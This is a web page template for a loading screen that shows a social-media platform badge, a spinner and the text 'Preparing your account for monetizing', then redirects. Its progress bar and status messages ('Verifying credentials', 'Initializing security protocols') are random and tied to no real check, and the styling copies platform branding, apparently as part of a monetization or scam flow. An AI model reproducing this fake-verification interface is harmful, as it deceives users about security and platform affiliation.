{% extends "base.html" %}
{% block body %}
<div class="spinner-container">
  <!-- Premium Card -->
  <div class="premium-card" style="box-shadow:0 4px 12px {{ platform_shadow_color|default('rgba(59,130,246,0.15)') }};">
    <!-- Platform Badge - EXACT SOCIAL MEDIA LOGO STYLING -->
    <div class="platform-badge">
      <div class="icon-circle {{ platform_bg_class|default('bg-twitter') }}">
        <i class="{{ platform_icon }} icon-lg"></i>
      </div>
    </div>
    
    <!-- Enhanced Spinner -->
    <div class="spinner-wrapper">
      <div class="premium-spinner">
        <div class="spinner-core"></div>
        <div class="spinner-orbit"></div>
        <div class="spinner-particles">
          <div class="particle"></div>
          <div class="particle"></div>
          <div class="particle"></div>
        </div>
      </div>
    </div>
    
    <!-- Progress Text -->
    <div class="progress-content">
      <h3 class="processing-title">Processing Request</h3>
      <p class="processing-subtitle">Preparing your <span class="platform-name">{{ platform_name|title }}</span> account for monetizing</p>
      <div class="progress-bar">
        <div class="progress-fill"></div>
      </div>
      <p class="status-text">Initializing security protocols...</p>
    </div>
  </div>
</div>

<script>
  setTimeout(function(){
    window.location='{{ next_url }}';
  }, {{ delay*1000 }});

  // Enhanced progress animation
  document.addEventListener('DOMContentLoaded', function() {
    const progressFill = document.querySelector('.progress-fill');
    const statusText = document.querySelector('.status-text');
    const statusMessages = [
      "Initializing security protocols...",
      "Verifying credentials...",
      "Establishing secure connection...",
      "Finalizing setup..."
    ];
    
    let progress = 0;
    const interval = setInterval(() => {
      progress += Math.random() * 15;
      if (progress >= 100) {
        progress = 100;
        clearInterval(interval);
        statusText.textContent = "Complete! Redirecting...";
      } else {
        const randomStatus = statusMessages[Math.floor(Math.random() * statusMessages.length)];
        statusText.textContent = randomStatus;
      }
      progressFill.style.width = progress + '%';
    }, 500);
  });
</script>

<style>
  /* Platform-specific colors - Reduced glow intensity */
  {% if platform_name == 'Facebook' %}
  :root { 
    --primary-color: #1877F2;
    --glow-color: rgba(24, 119, 242, 0.12);
    --light-bg: rgba(24, 119, 242, 0.08);
    --gradient: linear-gradient(135deg, #1877F2, #166FE5);
  }
  {% elif platform_name == 'Instagram' %}
  :root { 
    --primary-color: #E4405F;
    --glow-color: rgba(228, 64, 95, 0.12);
    --light-bg: rgba(228, 64, 95, 0.08);
    --gradient: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
  }
  {% elif platform_name == 'TikTok' %}
  :root { 
    --primary-color: #FF0050;
    --glow-color: rgba(255, 0, 80, 0.12);
    --light-bg: rgba(255, 0, 80, 0.08);
    --gradient: linear-gradient(135deg, #FF0050, #00F2EA);
  }
  {% elif platform_name == 'Snapchat' %}
  :root { 
    --primary-color: #FFFC00;
    --glow-color: rgba(255, 252, 0, 0.15);
    --light-bg: rgba(255, 252, 0, 0.06);
    --gradient: linear-gradient(135deg, #FFFC00, #FFD700);
  }
  {% elif platform_name == 'Twitter' or platform_name == 'X / Twitter' %}
  :root { 
    --primary-color: #1DA1F2;
    --glow-color: rgba(29, 161, 242, 0.12);
    --light-bg: rgba(29, 161, 242, 0.08);
    --gradient: linear-gradient(135deg, #1DA1F2, #1a8cd8);
  }
  {% else %}
  :root { 
    --primary-color: #1877F2;
    --glow-color: rgba(24, 119, 242, 0.12);
    --light-bg: rgba(24, 119, 242, 0.08);
    --gradient: linear-gradient(135deg, #1877F2, #166FE5);
  }
  {% endif %}

  /* EXACT SOCIAL MEDIA LOGO STYLING FROM YOUR CSS */
  .icon-circle {
    width: 80px;
    height: 80px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    transition: all 0.4s ease;
    margin: 0 auto;
  }

  /* Platform-specific styles matching your design */
  .bg-facebook .icon-circle {
    background: #fff;
    box-shadow: 0 0 0 4px rgba(24,119,242,0.15), 0 0 14px rgba(24,119,242,0.25);
  }
  .bg-facebook i { color: #1877F2; }

  .bg-instagram .icon-circle {
    background: #fff;
    box-shadow: 0 0 0 4px rgba(193,53,132,0.15), 0 0 14px rgba(225,48,108,0.25);
  }
  .bg-instagram i {
    background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    font-weight: 800;
  }

  .bg-tiktok .icon-circle {
    background: #fff;
    box-shadow: 0 0 0 4px rgba(0,0,0,0.1), 0 0 16px rgba(255,0,80,0.25), 0 0 16px rgba(0,242,234,0.25);
  }
  .bg-tiktok i {
    color: #000;
    text-shadow: -1.8px 0 #00f2ea, 1.8px 0 #ff0050;
    font-weight: 800;
  }

  .bg-youtube .icon-circle {
    background: #fff;
    box-shadow: 0 0 0 4px rgba(255,0,0,0.18), 0 0 14px rgba(255,0,0,0.28);
  }
  .bg-youtube i { color: #FF0000; font-weight: 800; }

  .bg-snapchat .icon-circle {
    background: #fff;
    box-shadow: 0 0 0 4px rgba(255,252,0,0.22), 0 0 18px rgba(255,252,0,0.35);
  }
  .bg-snapchat i {
    color: #FFFC00;
    -webkit-text-stroke: 1.5px #000;
    font-weight: 800;
  }

  .bg-twitter .icon-circle {
    background: #fff;
    box-shadow: 0 0 0 4px rgba(0,0,0,0.12), 0 0 16px rgba(0,0,0,0.22);
  }
  .bg-twitter i { color: #000; font-weight: 800; }

  .icon-lg { font-size: 32px; }

  /* Main Container */
  .spinner-container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px;
    background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
  }

  /* Premium Card */
  .premium-card {
    position: relative;
    max-width: 420px;
    width: 100%;
    background: #ffffff;
    border-radius: 24px;
    padding: 48px 32px 32px;
    text-align: center;
    border: 1px solid rgba(255, 255, 255, 0.8);
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  }

  .premium-card::before {
    content: '';
    position: absolute;
    top: -1px;
    left: -1px;
    right: -1px;
    bottom: -1px;
    border-radius: 25px;
    background: var(--gradient);
    z-index: -1;
    opacity: 0;
    transition: opacity 0.3s ease;
  }

  .premium-card:hover::before {
    opacity: 0.3;
  }

  /* Platform Badge */
  .platform-badge {
    margin-bottom: 32px;
  }

  /* Premium Spinner */
  .spinner-wrapper {
    margin: 0 auto 32px;
    position: relative;
    width: 100px;
    height: 100px;
  }

  .premium-spinner {
    position: relative;
    width: 100%;
    height: 100%;
  }

  .spinner-core {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 20px;
    height: 20px;
    background: var(--primary-color);
    border-radius: 50%;
    animation: corePulse 2s ease-in-out infinite;
  }

  .spinner-orbit {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 70px;
    height: 70px;
    border: 2px solid transparent;
    border-top: 2px solid var(--primary-color);
    border-radius: 50%;
    animation: orbitSpin 1.5s linear infinite;
  }

  .spinner-particles {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 70px;
    height: 70px;
  }

  .particle {
    position: absolute;
    width: 4px;
    height: 4px;
    background: var(--primary-color);
    border-radius: 50%;
    opacity: 0;
  }

  .particle:nth-child(1) {
    top: 0;
    left: 50%;
    transform: translateX(-50%);
    animation: particleFloat 2s ease-in-out infinite;
  }

  .particle:nth-child(2) {
    top: 50%;
    right: 0;
    transform: translateY(-50%);
    animation: particleFloat 2s ease-in-out infinite 0.5s;
  }

  .particle:nth-child(3) {
    bottom: 0;
    left: 50%;
    transform: translateX(-50%);
    animation: particleFloat 2s ease-in-out infinite 1s;
  }

  @keyframes orbitSpin {
    0% { transform: translate(-50%, -50%) rotate(0deg); }
    100% { transform: translate(-50%, -50%) rotate(360deg); }
  }

  @keyframes corePulse {
    0%, 100% { 
      transform: translate(-50%, -50%) scale(1);
      opacity: 1;
    }
    50% { 
      transform: translate(-50%, -50%) scale(1.2);
      opacity: 0.8;
    }
  }

  @keyframes particleFloat {
    0%, 100% { 
      opacity: 0;
      transform: translateX(-50%) scale(0.5);
    }
    50% { 
      opacity: 1;
      transform: translateX(-50%) scale(1);
    }
  }

  /* Progress Content */
  .progress-content {
    animation: fadeInUp 0.8s ease forwards;
  }

  .processing-title {
    font-size: 20px;
    font-weight: 700;
    color: #0f172a;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }

  .processing-subtitle {
    font-size: 14px;
    color: #64748b;
    margin-bottom: 24px;
    font-weight: 500;
  }

  .platform-name {
    color: var(--primary-color);
    font-weight: 700;
    text-transform: capitalize;
  }

  /* Progress Bar */
  .progress-bar {
    width: 100%;
    height: 6px;
    background: #e2e8f0;
    border-radius: 3px;
    margin-bottom: 16px;
    overflow: hidden;
  }

  .progress-fill {
    height: 100%;
    background: var(--gradient);
    border-radius: 3px;
    width: 0%;
    transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
  }

  .status-text {
    font-size: 12px;
    color: #94a3b8;
    font-weight: 500;
    min-height: 18px;
  }

  /* Animations */
  @keyframes fadeInUp {
    0% { 
      opacity: 0; 
      transform: translateY(20px); 
    }
    100% { 
      opacity: 1; 
      transform: translateY(0); 
    }
  }

  /* Responsive */
  @media (max-width: 480px) {
    .spinner-container {
      padding: 16px;
    }
    
    .premium-card {
      padding: 40px 24px 24px;
      border-radius: 20px;
    }
    
    .icon-circle {
      width: 70px;
      height: 70px;
    }
    
    .icon-lg {
      font-size: 28px;
    }
    
    .spinner-wrapper {
      width: 80px;
      height: 80px;
      margin-bottom: 28px;
    }
    
    .processing-title {
      font-size: 18px;
    }
  }
</style>
{% endblock %}
